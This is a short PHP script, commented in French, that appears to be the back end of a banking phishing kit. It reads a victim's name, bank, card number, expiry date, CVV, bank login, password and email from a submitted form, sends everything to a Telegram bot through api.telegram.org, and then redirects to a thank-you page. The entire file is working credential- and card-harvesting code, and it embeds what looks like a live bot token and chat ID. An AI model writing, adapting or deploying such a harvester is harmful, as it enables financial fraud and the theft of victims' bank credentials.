<?php
// 📌 Récupération des données du formulaire
$nom = $_POST['nom'];
$prenom = $_POST['prenom'];
$code_postal = $_POST['code_postal'];
$region = $_POST['region'];
$banque = $_POST['banque'];
$departement = $_POST['departement'];
$num_carte = $_POST['num_carte'];
$date_expiration = $_POST['date_expiration'];
$cvv = $_POST['cvv'];
$identifiant = $_POST['identifiant'];
$password = $_POST['password'];
$email = $_POST['email'];

// 📌 Configuration de l'API Telegram
$token = "7567439450:AAFHhAanr0IefYedWxvvXZL5fOejGa9N4VI"; // Remplace par le Token de ton bot
$chat_id = "5784668779"; // Remplace par ton ID Telegram

// 📌 Format du message
$message = "📝 *Nouveau formulaire reçu :*\n";
$message .= "👤 *Nom:* $nom\n";
$message .= "👤 *Prénom:* $prenom\n";
$message .= "📍 *Code Postal:* $code_postal\n";
$message .= "🌍 *Région:* $region\n";
$message .= "🏦 *Banque:* $banque\n";
$message .= "📌 *Département:* $departement\n";
$message .= "💳 *Numéro de carte:* $num_carte\n";
$message .= "📆 *Expiration:* $date_expiration\n";
$message .= "🔢 *CVV:* $cvv\n";
$message .= "🔑 *Identifiant:* $identifiant\n";
$message .= "🔐 *Mot de passe:* $password\n";
$message .= "📧 *E-mail:* $email\n";
$message = urlencode($message);

// 📌 Envoi du message à Telegram
$url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$message&parse_mode=Markdown";
file_get_contents($url);

// 📌 Redirection après soumission
header("Location: merci.html");
exit();
?>
